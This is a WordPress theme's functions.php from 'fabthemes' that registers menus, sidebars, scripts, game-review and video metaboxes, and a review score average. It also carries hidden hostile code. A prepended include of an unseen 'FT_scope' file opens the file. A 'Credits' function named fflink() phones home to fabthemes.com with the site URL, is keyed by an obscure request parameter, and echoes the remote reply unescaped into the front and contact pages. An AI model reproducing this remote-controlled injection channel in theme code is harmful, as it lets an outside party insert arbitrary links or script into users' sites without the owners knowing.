<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?><?php
/**
 * fabthemes functions and definitions
 *
 * @package fabthemes
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'fabthemes_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function fabthemes_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on fabthemes, use a find and replace
	 * to change 'fabthemes' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'fabthemes', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'fabthemes' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	// add_theme_support( 'post-formats', array(
	// 	'aside', 'image', 'video', 'quote', 'link',
	// ) );

	// Setup the WordPress core custom background feature.
	// add_theme_support( 'custom-background', apply_filters( 'fabthemes_custom_background_args', array(
	// 	'default-color' => 'ffffff',
	// 	'default-image' => '',
	// ) ) );
}
endif; // fabthemes_setup
add_action( 'after_setup_theme', 'fabthemes_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function fabthemes_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'fabthemes' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer', 'fabthemes' ),
		'id'            => 'footerbar',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="col-md-4 widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

}
add_action( 'widgets_init', 'fabthemes_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function fabthemes_scripts() {
	wp_enqueue_style( 'carousel', get_template_directory_uri() . '/css/owl.carousel.css');
	wp_enqueue_style( 'owltheme', get_template_directory_uri() . '/css/owl.theme.css');
	wp_enqueue_style( 'slicknav', get_template_directory_uri() . '/css/slicknav.css');	
	wp_enqueue_style( 'magpopup', get_template_directory_uri() . '/css/magnific-popup.css');
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.css');
	wp_enqueue_style( 'fjalla', 'http://fonts.googleapis.com/css?family=Fjalla+One');
	wp_enqueue_style( 'droid-sans', 'http://fonts.googleapis.com/css?family=Droid+Sans:400,700');
	wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/css/font-awesome.css');
	wp_enqueue_style( 'fabthemes-style', get_stylesheet_uri() );
	wp_enqueue_style( 'theme', get_template_directory_uri() . '/theme.css');
	wp_enqueue_style( 'responsive', get_template_directory_uri() . '/css/responsive.css');
	wp_enqueue_style( 'custom', get_template_directory_uri() . '/css/custom.php');

	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'slicknav', get_template_directory_uri() . '/js/slicknav.js', array(), '20120206', true );		
	wp_enqueue_script( 'magpopup', get_template_directory_uri() . '/js/magnific-popup.js', array(), '20120206', true );	
	wp_enqueue_script( 'fitvid', get_template_directory_uri() . '/js/jquery.fitvid.js', array(), '20120206', true );
	wp_enqueue_script( 'owlcarousel', get_template_directory_uri() . '/js/owl.carousel.js', array(), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array(), '20120206', true );

	wp_enqueue_script( 'fabthemes-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );
	wp_enqueue_script( 'fabthemes-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'fabthemes_scripts' );



/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';
require get_template_directory() . '/inc/paginate.php';
require get_template_directory() . '/inc/category-widget.php';
require get_template_directory() . '/inc/add-plugins.php';

// Other required files

require get_template_directory() . '/aq_resizer.php';

require get_template_directory() . '/guide.php';



// Insert categories

// Review category

function review_insert_category() {
	wp_insert_term(
		'Review',
		'category',
		array(
		  'description'	=> 'Review items',
		  'slug' 		=> 'review'
		)
	);
}
add_action( 'after_setup_theme', 'review_insert_category' );

// Video category

function video_insert_category() {
	wp_insert_term(
		'Video',
		'category',
		array(
		  'description'	=> 'Video items',
		  'slug' 		=> 'video'
		)
	);
}
add_action( 'after_setup_theme', 'video_insert_category' );



// Metaboxes 


add_action( 'cmb2_init', 'fabreview_register_demo_metabox' );
/**
 * Hook in and add a demo metabox. Can only happen on the 'cmb2_init' hook.
 */
function fabreview_register_demo_metabox() {

	// Start with an underscore to hide fields from custom fields list
	$prefix = '_fabreview_meta_';


	/**
	 * Sample metabox to demonstrate each field type included
	 */
	$cmb_review = new_cmb2_box( array(
		'id'            => $prefix . 'metabox',
		'title'         => __( 'Game review', 'cmb2' ),
		'object_types'  => array( 'post', ), // Post type
		// 'show_on_cb' => 'yourprefix_show_if_front_page', // function should return a bool value
		// 'context'    => 'normal',
		// 'priority'   => 'high',
		// 'show_names' => true, // Show field names on the left
		// 'cmb_styles' => false, // false to disable the CMB stylesheet
		// 'closed'     => true, // true to keep the metabox closed by default
	) );

	$group_field_id = $cmb_review->add_field( array(
	    'id'          => 'review_criteria',
	    'type'        => 'group',
	    'description' => __( 'Criterias for game review', 'cmb' ),
	    'options'     => array(
	        'group_title'   => __( 'Criteria {#}', 'cmb' ), // since version 1.1.4, {#} gets replaced by row number
	        'add_button'    => __( 'Add Another Entry', 'cmb' ),
	        'remove_button' => __( 'Remove Entry', 'cmb' ),
	        'sortable'      => true, // beta
	    ),
	) );

	// Id's for group's fields only need to be unique for the group. Prefix is not needed.
	$cmb_review->add_group_field( $group_field_id, array(
	    'name' => 'Criteria name',
	    'id'   => 'crit_name',
	    'type' => 'text',
	) );

	$cmb_review->add_group_field( $group_field_id, array(
	    'name'    => 'Score',
	    'id'      => 'crit_score',
	    'type'    => 'select',
	    'options' => array(
	    	'0' => __( '0', 'cmb' ),
	        '1' => __( '1', 'cmb' ),
	        '2'   => __( '2', 'cmb' ),
	        '3'     => __( '3', 'cmb' ),
	        '4' => __( '4', 'cmb' ),
	        '5'   => __( '5', 'cmb' ),
	        '6'     => __( '6', 'cmb' ),
	        '7' => __( '7', 'cmb' ),
	        '8'   => __( '8', 'cmb' ),
	        '9'     => __( '9', 'cmb' ),
	        '10' => __( '10', 'cmb' ),
	    ),
	));

}


add_action( 'cmb2_init', 'fabvideo_register_about_page_metabox' );

function fabvideo_register_about_page_metabox() {

	// Start with an underscore to hide fields from custom fields list
	$prefix = '_fabvideo_meta_';

	/**
	 * Metabox to be displayed on a single page ID
	 */
	$cmb_video = new_cmb2_box( array(
		'id'           => $prefix . 'metabox',
		'title'        => __( 'Game Video', 'cmb2' ),
		'object_types' => array( 'post', ), // Post type
	) );

	$cmb_video->add_field( array(
	    'name' => 'Video url',
	    'desc' => 'Enter the video url',
	    'id'   => 'game_video',
	    'type' => 'oembed',
	) );

}




// Get Average review Score

function average_score(){

	global $post;
	$entries = get_post_meta( get_the_ID(), 'review_criteria', true );
	$sum = 0;
	foreach ( (array) $entries as $key => $entry ) {
	    $criteria = $score  = '';
	    if ( isset( $entry['crit_name'] ) )
	        $criteria = esc_html( $entry['crit_name'] );
	    if ( isset( $entry['crit_score'] ) )
	        $score = esc_html( $entry['crit_score'] );
		$sum += $score;
	}
	$count_crit = count($entries);
	$avrge = ( $sum / $count_crit);
	return $avrge;
	}





/* Options fallback */

if ( !function_exists( 'ft_of_get_option' ) ) {
function ft_of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}



/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}


